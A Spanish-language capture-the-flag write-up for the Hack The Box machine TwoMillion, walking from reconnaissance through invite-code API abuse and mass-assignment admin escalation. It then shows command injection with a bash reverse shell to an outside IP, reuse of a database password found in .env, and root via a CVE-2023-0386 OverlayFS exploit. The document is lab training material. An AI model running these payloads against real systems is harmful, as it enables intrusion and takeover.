
### Obtención de información

Empezamos con la fase de reconocimiento para ver que servicios están expuestos:

```bash
nmap -p- --open  -Pn -T5 -n -sSV 10.129.3.160 
```

Vemos que están activos los siguientes puertos:

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Ahora lanzaremos unos scripts de nmap para saber las versiones de los servicios y también si hay alguna vulnerabilidad de entrada:

```bash
nmap -p22,80 -Pn -T5 -n -sCV 10.129.3.160 -oN
```


```
Starting Nmap 7.95 ( https://nmap.org ) at 2026-02-20 14:39 WET
Nmap scan report for 10.129.3.160
Host is up (0.059s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx
|_http-title: Did not follow redirect to http://2million.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Si nos fijamos en el puerto 80 aparece: `_http-title: Did not follow redirect to http://2million.htb/` esto quiere decir que hay virtual hosting por tanto tendremos que añadir en `/etc/hosts` lo siguiente:

```
10.129.3.160    2million.htb
```

Si entramos a la pagina veremos lo siguiente:

![[Pasted image 20260220161402.png]]

Si leemos la categoría faq nos daremos cuenta de que para entrar hay que conseguir "hackear el codigo de invitacion":

![[Pasted image 20260220161525.png]]

Por tanto si clickamos en `here` nos mandará hacia la siguiente pantalla:

![[Pasted image 20260220161636.png]]

Si hacemos ctrl + u para inspeccionar el codigo html veremos que se llaman  a dos funcionalidades js:

![[Pasted image 20260220161925.png]]

hace tanto una validación como llama a otro archivo js. Si vemos el contenido de ese js veremos que el código está ofuscado:

```js
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('1 i(4){h 8={"4":4};$.9({a:"7",5:"6",g:8,b:\'/d/e/n\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}1 j(){$.9({a:"7",5:"6",b:\'/d/e/k/l/m\',c:1(0){3.2(0)},f:1(0){3.2(0)}})}',24,24,'response|function|log|console|code|dataType|json|POST|formData|ajax|type|url|success|api/v1|invite|error|data|var|verifyInviteCode|makeInviteCode|how|to|generate|verify'.split('|'),0,{}))
```

Por tanto para poder leerlo iremos a https://thanhle.io.vn/de4js/ donde podremos desofuscarlo. Este es el resultado:

```js
function verifyInviteCode(code) {
    var formData = {
        "code": code
    };
    $.ajax({
        type: "POST",
        dataType: "json",
        data: formData,
        url: '/api/v1/invite/verify',
        success: function (response) {
            console.log(response)
        },
        error: function (response) {
            console.log(response)
        }
    })
}

function makeInviteCode() {
    $.ajax({
        type: "POST",
        dataType: "json",
        url: '/api/v1/invite/how/to/generate',
        success: function (response) {
            console.log(response)
        },
        error: function (response) {
            console.log(response)
        }
    })
}
```

Como podemos observar hay una llamada a una api que pone how to generate por tanto podemos probar a ejecutar la función desde la consola del navegador:


![[Pasted image 20260220162657.png]]

ahí ya podemos ver un mensaje encriptado en ROT13, cifrado muy simple que sustituye cada letra por la que está 13 posiciones más adelante en el alfabeto. Podemos desencriptarlo en cualquier web que lo permita, el resultado es el siguiente:

```
In order to generate the invite code, make a POST request to /api/v1/invite/generate
```

Si hacemos una petición a `http://2million.htb/api/v1/invite/generate` obtendremos el código encodeado en base64:

![[Pasted image 20260220174131.png]]
Se decodearía con el siguiente comando:
```bash
echo "VjFDTEUtQTBNRlotMzZDUEgtM1EwRjI=" | base64 -d 

	V1CLE-A0MFZ-36CPH-3Q0F2
```

Con ese código ya podemos registrarnos. Tras iniciar sesión veremos la siguiente interfaz:

![[Pasted image 20260220174403.png]]

Si vamos a /access nos deja descargar la VPN que se usaría en HTB para acceder a las máquinas. Si hacemos hovering por encima del botón `Connection Pack` vemos la siguiente llamada a una API: `/api/v1/user/generate` por tanto sabemos que hay una API que puede que tenga mas endpoints. Si accedemos a `/api/v1` con:

```bash
curl -X GET http://2million.htb/api/v1 -b "PHPSESSID=rspi5tbg102c9gm34sauerg23n" -H "Content-Type: application/json" | jq 
```

Veremos:

```json
{
  "v1": {
    "user": {
      "GET": {
        "/api/v1": "Route List",
        "/api/v1/invite/how/to/generate": "Instructions on invite code generation",
        "/api/v1/invite/generate": "Generate invite code",
        "/api/v1/invite/verify": "Verify invite code",
        "/api/v1/user/auth": "Check if user is authenticated",
        "/api/v1/user/vpn/generate": "Generate a new VPN configuration",
        "/api/v1/user/vpn/regenerate": "Regenerate VPN configuration",
        "/api/v1/user/vpn/download": "Download OVPN file"
      },
      "POST": {
        "/api/v1/user/register": "Register a new user",
        "/api/v1/user/login": "Login with existing user"
      }
    },
    "admin": {
      "GET": {
        "/api/v1/admin/auth": "Check if user is admin"
      },
      "POST": {
        "/api/v1/admin/vpn/generate": "Generate VPN for specific user"
      },
      "PUT": {
        "/api/v1/admin/settings/update": "Update user settings"
      }
    }
  }
}
```

Como podemos observar hay diferentes endpoints, pero lo que mas llama la atención son los endpoints de admin. Si probamos a interactuar con  los dos primeros no nos dejará hacer gran cosa dado que no somos admin. No obstante,  el último parece no tener validación, por tanto si conseguimos averiguar el cuerpo de la solicitud quizá consigamos elevar privilegios:

```bash
curl -X PUT http://2million.htb/api/v1/admin/settings/update \
  -b "PHPSESSID=rspi5tbg102c9gm34sauerg23n" \
  -H "Content-Type: application/json" \
  -d '{"test":"value"}'
{"status":"danger","message":"Missing parameter: email"}

curl -X PUT http://2million.htb/api/v1/admin/settings/update \
  -b "PHPSESSID=rspi5tbg102c9gm34sauerg23n" \
  -H "Content-Type: application/json" \
  -d '{"email":"test@test.com"}'
{"status":"danger","message":"Missing parameter: is_admin"} 

curl -X PUT http://2million.htb/api/v1/admin/settings/update \
  -b "PHPSESSID=rspi5tbg102c9gm34sauerg23n" \
  -H "Content-Type: application/json" \
  -d '{"email":"test@test.com", "is_admin":"true"}'
{"status":"danger","message":"Variable is_admin needs to be either 0 or 1."} 

curl -X PUT http://2million.htb/api/v1/admin/settings/update \
  -b "PHPSESSID=rspi5tbg102c9gm34sauerg23n" \
  -H "Content-Type: application/json" \
  -d '{"email":"test@test.com", "is_admin":1}'  
{"id":13,"username":"test","is_admin":1} 
```

Ahora somos administradores:

```bash
curl -X GET http://2million.htb/api/v1/admin/auth -b "PHPSESSID=rspi5tbg102c9gm34sauerg23n"     
{"message":true} 
```

Por tanto, vamos a interactuar con el endpoint de administrador que nos queda `api/v1/admin/vpn/generate`. Este endpoint ejecuta un comando en el sistema para generar la VPN, por tanto, es probable que como es un endpoint solo para administradores no esté bien sanitizado. Si lo comprobamos con:

```bash
curl -X POST http://2million.htb/api/v1/admin/vpn/generate -b "PHPSESSID=m3d750fjg0khqqodgb4hq2adat" -H "Content-Type: application/json" -d '{"username":"test; whoami;"}'
```

Veremos que obtenemos el usuario `www-data` por tanto hay ejecución remota de comandos. Nos aprovecharemos de esto con la siguiente reverse shell:

```bash 
curl -X POST http://2million.htb/api/v1/admin/vpn/generate -b "PHPSESSID=m3d750fjg0khqqodgb4hq2adat" -H "Content-Type: application/json" -d '{"username":"test; bash -c \"sh -i >& /dev/tcp/10.10.16.68/9001 0>&1;\""}'
```

Ahora estamos dentro con el usuario www-data. Si listamos el archivo `/etc/passwd ` veremos que hay un usuario `admin`, si intentamos acceder al directorio para leer su flag nos dirá que no tenemos los permisos necesarios, es decir, tenemos que conseguir ser admin. Para ello si exploramos un poco más el directorio `html`donde estamos una vez conseguimos acceder con la reverse shell veremos el siguiente archivo `.env`:

```bash 
cat .env
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass123
```

Si hacemos

```bash 
su admin 
```

 Y ponemos esa contraseña nos convertiremos en admin y podremos leer la user flag:
![[Pasted image 20260222140005.png]]

### Escalada de privilegios

Si ejecutamos lo cualquiera de los siguientes dos comandos:

```bash
find / -perm -4000 2>/dev/null; getcap / -r 2>/dev/null 
```

No veremos nada de interés. Sin embargo si buscamos por archivos en el sistema pertenecientes al usuario admin con:

```bash
find / -user admin 2>/dev/null | grep -vE "sys|proc"
```

Encontremos el siguiente archivo sospechoso `/var/mail/admin`:

![[Pasted image 20260223141955.png]]

Que si lo leemos:

![[Pasted image 20260222141042.png]]

Básicamente dice que hay un CVE en el sistema relacionado con OverlayFS / Fuse. Si buscamos en google lo siguiente encontraremos un CVE relacionado con la escalada de privilegios:

![[Pasted image 20260223134219.png]]

Y si buscamos un exploit para este CVE lo encontraremos aquí mismo: `https://github.com/sxlmnwb/CVE-2023-0386` donde nos explica como compilarlo y ejecutarlo. 

1.  Nos descargamos el zip
2.  Montamos un servidor python con
   ```bash
   python3 -m http.server 8080
   ```
3.  Descargamos el zip en la maquina twomillion con 

 ```bash
 wget http://<ip>:<puerto>/CVE-2023-0386-master.zip
 ```
 4.  Descomprimimos el archivo con `unzip` y realizamos lo que nos dicen las indicaciones del README:
	 1.  Compilamos con `make all`
	 2.  En una terminal ejecutamos `./fuse ./ovlcap/lower ./gc` 
	 3.  En otra terminal ejecutamos  ./exp 

Y de esta manera nos convertimos en root:
![[Pasted image 20260223141353.png]]    